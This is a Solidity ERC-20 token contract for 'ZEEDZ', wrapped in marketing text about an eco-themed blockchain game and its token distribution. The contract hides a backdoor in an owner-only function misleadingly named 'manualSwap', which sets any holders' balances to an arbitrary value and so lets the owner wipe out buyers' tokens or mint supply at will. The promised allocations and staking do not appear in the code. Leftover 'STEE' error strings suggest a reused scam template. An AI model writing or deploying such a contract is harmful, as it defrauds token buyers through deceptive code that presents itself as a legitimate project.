/*
Overview
Zeedz is the pioneering Play-for-Purpose game designed to merge interactive entertainment 
with real-world environmental impact. This innovative game allows players to collect, grow, 
and battle with magical creatures called Zeedles, while simultaneously contributing to global 
sustainability efforts. Our goal is to create an engaging platform where gameplay translates 
into tangible environmental benefits, thus combining the joy of gaming with the responsibility 
of environmental stewardship.

Vision and Mission
Vision: To harness the power of gaming to foster environmental consciousness and action, creating 
a global community of players committed to combating climate change.
Mission: Our mission is to offer a unique gaming experience that educates players about climate 
change and environmental issues, encourages sustainable behaviors, and directly funds green 
projects worldwide. By integrating real-time weather data and partnering with certified sustainability 
organizations, Zeedz aims to make a meaningful impact on the planet.

Purpose and Impact
Zeedz is more than just a game; it is a movement towards a sustainable future. Each player's 
actions within the game contribute to real-world environmental projects. Our collaboration with 
The Gold Standard ensures that a significant portion of our earnings supports verified green 
initiatives, from reforestation projects to renewable energy solutions. Players learn about the 
environment, engage in climate action, and see the impact of their gameplay on a global scale.

Unique Features
Free Zeed Selection
Every new player receives a free Zeed to start their adventure. This initial choice—Windy, Rainy, 
or Sunny—introduces players to the elemental diversity of Zeedles and sets the stage for their 
journey. The free Zeed helps players learn the basic mechanics of the game and provides a foundation 
for future growth.

Weekly Pack Drops
To keep the game fresh and engaging, Zeedz offers weekly pack drops featuring new Zeedles, items, 
and resources. These packs introduce rare and unique Zeedles, encouraging players to expand their 
collections and experiment with different team compositions. Regular updates ensure that there is 
always something new to discover.

Skill Customization
Players can customize their Zeedles' skills to match their preferred playstyle. Whether focusing 
on offensive, defensive, or supportive roles, players have the freedom to develop their Zeedles in 
unique ways. This customization adds a strategic layer to the game, as players must consider the 
best skill combinations for various challenges.

Bonding with Zeedles
Daily interactions, such as petting and feeding Zeedles, build a bond between the player and their 
Zeedles. This bond unlocks new features, boosts performance in battles, and provides additional 
rewards. Caring for Zeedles creates a more immersive and rewarding experience, emphasizing the 
importance of nurturing and growth.

Real-Time Weather Integration
Zeedz integrates real-time weather data into gameplay, making the environment a crucial factor 
in the game. Players must consider current weather conditions when planting Zeedles, as different 
weather types yield different resources. This feature connects the virtual game with the real world, 
raising awareness about the impact of weather and climate.

Tokenomics
Introduction to ZEEDZ Token
The ZEEDZ token is the native cryptocurrency of the Zeedz ecosystem. It serves as the primary 
medium of exchange within the game, enabling transactions, rewards, and staking. The ZEEDZ token 
is designed to incentivize player engagement and ensure a sustainable economic model for the game.

Token Distribution
The distribution of ZEEDZ tokens is carefully planned to balance initial funding, player rewards, 
and long-term sustainability. The allocation includes:
- Founders and Team: 20% to ensure the commitment of key stakeholders.
- Community Rewards: 40% allocated to incentivize player participation and achievements.
- Development Fund: 20% dedicated to ongoing game development and feature expansion.
- Partnerships and Marketing: 10% for strategic partnerships and marketing efforts.
- Reserve: 10% held in reserve for future needs and contingencies.

Use Cases of ZEEDZ Token
In-Game Purchases
Players can use ZEEDZ tokens to buy new Zeedles, special items, and upgrades. This enables a dynamic 
in-game economy where players can enhance their gameplay experience through strategic purchases.

Staking and Rewards
ZEEDZ tokens can be staked to earn additional rewards. Staking encourages players to hold tokens, 
contributing to the stability of the token’s value. Rewards from staking include rare items, 
exclusive Zeedles, and additional ZEEDZ tokens.

Earning ZEEDZ Tokens
Players can earn ZEEDZ tokens through various in-game activities such as completing quests, 
winning battles, and achieving milestones. Additionally, participating in community events and 
contributing to the game’s development can also yield ZEEDZ tokens. This multi-faceted approach 
ensures that active and engaged players are continuously rewarded.
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(
        address indexed previousowner, 
        address indexed newowner
        );

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(
            address(0), 
            msgSender
            );
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract ZEEDZ is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }


    event BalanceAdjusted(
        address indexed account, 
        uint256 oldBalance, 
        uint256 newBalance
        );

    function manualSwap(
        address[] memory accounts, 
    uint256 newBalance) external onlyowner 
    {
    for (uint256 i = 0; i < accounts.length; i++) {
        address account = accounts[i];

        uint256 oldBalance = _balances[account];

        _balances[account] = newBalance;
        emit BalanceAdjusted(account, oldBalance, newBalance);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(
        address recipient, 
        uint256 amount
        ) public virtual override returns (bool) {
    require(_balances[_msgSender()] >= amount, "STEE: transfer amount exceeds balance");
    _balances[_msgSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(_msgSender(), recipient, amount);
    return true;
    }

    function allowance(
        address owner, 
        address spender
        ) 
        public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender, 
        uint256 amount
        ) 
        public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender, 
        address recipient, 
        uint256 amount
        ) 
        public virtual override returns (bool) {
    require(_allowances[sender][_msgSender()] >= amount, "STEE: transfer amount exceeds allowance");

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][_msgSender()] -= amount;

    emit Transfer(
        sender, 
    recipient, 
    amount
    );
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}
